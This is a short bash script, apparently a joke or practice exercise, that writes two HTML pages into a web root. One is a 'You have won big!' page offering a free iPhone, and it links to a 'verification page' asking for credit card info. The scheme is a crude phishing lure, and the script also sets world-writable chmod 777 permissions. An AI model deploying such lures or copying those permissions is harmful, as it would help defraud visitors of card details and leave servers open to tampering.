#this is a bashy boi for making some hot hot html action, buckle up buckaroo

cd /var/www/html

sudo touch index.html
sudo chmod 777 index.html

echo "<html><head><title>You have won big!</title></head><body><a href = "/var/www/html/A/A.html">Click here for a free iphone</a></body></html>" > index.html

sudo rm -r A
sudo mkdir A
cd A

sudo touch A.html
sudo chmod 777 A.html

echo  "<html> <head><title>verification page</title></head> <body>Please enter your credit card info<body> </html>" > A.html

